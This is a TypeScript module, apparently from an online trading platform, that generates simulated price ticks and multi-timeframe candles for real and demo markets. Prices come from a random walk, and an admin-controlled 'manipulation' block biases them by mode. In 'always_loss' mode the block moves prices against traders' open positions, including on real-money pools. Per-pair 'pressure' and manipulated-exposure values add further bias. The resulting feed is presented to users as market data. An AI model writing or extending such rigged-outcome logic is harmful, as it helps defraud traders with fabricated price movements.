import { 
  markets_real, markets_demo, 
  history_real, history_demo, 
  currentCandles_real, currentCandles_demo,
  saveCandleToDB_v2, TIMEFRAMES, timeframeSecondsMap,
  isMarketClosedAt
} from './marketService.ts';
import { getIO } from './socketService.ts';
import { tradeExposureCache, manipulatedExposureCache } from './tradeService.ts';
import { globalManipulationMode } from './marketService.ts';

export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
  if (isMarketClosedAt(pair, now)) {
    return null;
  }
  const pool = type === 'real' ? markets_real : markets_demo;
  const historyPool = type === 'real' ? history_real : history_demo;
  const candlePool = type === 'real' ? currentCandles_real : currentCandles_demo;
  
  const m = pool[pair];
  if (!m) return null;

  const currentPrice = Number(m.price) || 100.00;

  // Clean, smooth random walk like the user's preferred trading app
  let change = (Math.random() - 0.49) * 0.3 * (currentPrice * 0.0005);

  // Admin Pressure / Manipulation support
  const exposureKey = `${pair}_${type}`;
  const exposure = tradeExposureCache.get(exposureKey) || 0;
  const manipExposure = manipulatedExposureCache.get(exposureKey) || 0;
  
  let bias = 0;
  if (globalManipulationMode === 'always_loss') {
    bias = exposure > 0 ? -0.0004 : 0.0004;
  } else if (globalManipulationMode === 'always_win') {
    bias = exposure > 0 ? 0.0004 : -0.0004;
  }
  if (manipExposure !== 0) {
    bias += manipExposure > 0 ? 0.0005 : -0.0005;
  }
  if (m.pressure) {
    bias += (m.pressure / 100) * 0.0005;
  }

  let newPrice = Number((currentPrice + change + (bias * currentPrice)).toFixed(5));
  if (newPrice <= 0) newPrice = 1.00;
  m.price = newPrice;

  // Update all timeframes
  for (const tf of TIMEFRAMES) {
    const tfSeconds = timeframeSecondsMap[tf];
    const bucketTime = now - (now % tfSeconds);
    if (!candlePool[pair]) candlePool[pair] = {};
    let activeCandle = candlePool[pair][tf];

    if (!activeCandle) {
      candlePool[pair][tf] = {
        open: newPrice,
        high: newPrice,
        low: newPrice,
        close: newPrice,
        volume: Math.random() * 20 + 5,
        openTime: bucketTime,
        closeTime: bucketTime + tfSeconds
      };
      saveCandleToDB_v2(pair, type, tf, candlePool[pair][tf]);
    } else if (bucketTime > activeCandle.openTime) {
      // Completed candle
      const completed = { ...activeCandle };
      saveCandleToDB_v2(pair, type, tf, completed);

      if (!historyPool[pair]) historyPool[pair] = {};
      if (!historyPool[pair][tf]) historyPool[pair][tf] = [];
      
      const historyRow = {
        time: completed.openTime,
        open: completed.open,
        high: completed.high,
        low: completed.low,
        close: completed.close,
        volume: completed.volume,
        openTime: completed.openTime,
        closeTime: completed.closeTime
      };

      historyPool[pair][tf].push(historyRow);
      if (historyPool[pair][tf].length > 1000) historyPool[pair][tf].shift();

      try {
        getIO().to(`market_${pair}_${type}`).emit('candle_complete', { pair, timeframe: tf, candle: historyRow });
      } catch(e) {}

      // New candle starts precisely at previous close
      candlePool[pair][tf] = {
        open: completed.close,
        high: Math.max(completed.close, newPrice),
        low: Math.min(completed.close, newPrice),
        close: newPrice,
        volume: Math.random() * 20 + 5,
        openTime: bucketTime,
        closeTime: bucketTime + tfSeconds
      };
      saveCandleToDB_v2(pair, type, tf, candlePool[pair][tf]);
    } else {
      activeCandle.close = newPrice;
      activeCandle.high = Math.max(activeCandle.high, newPrice);
      activeCandle.low = Math.min(activeCandle.low, newPrice);
      activeCandle.volume += Math.random() * 2;
    }
  }

  const active5s = candlePool[pair]?.["5 seconds"];
  return {
    price: newPrice,
    time: now,
    candle: active5s ? {
      time: active5s.openTime,
      open: active5s.open,
      high: active5s.high,
      low: active5s.low,
      close: active5s.close,
      volume: active5s.volume
    } : null
  };
}
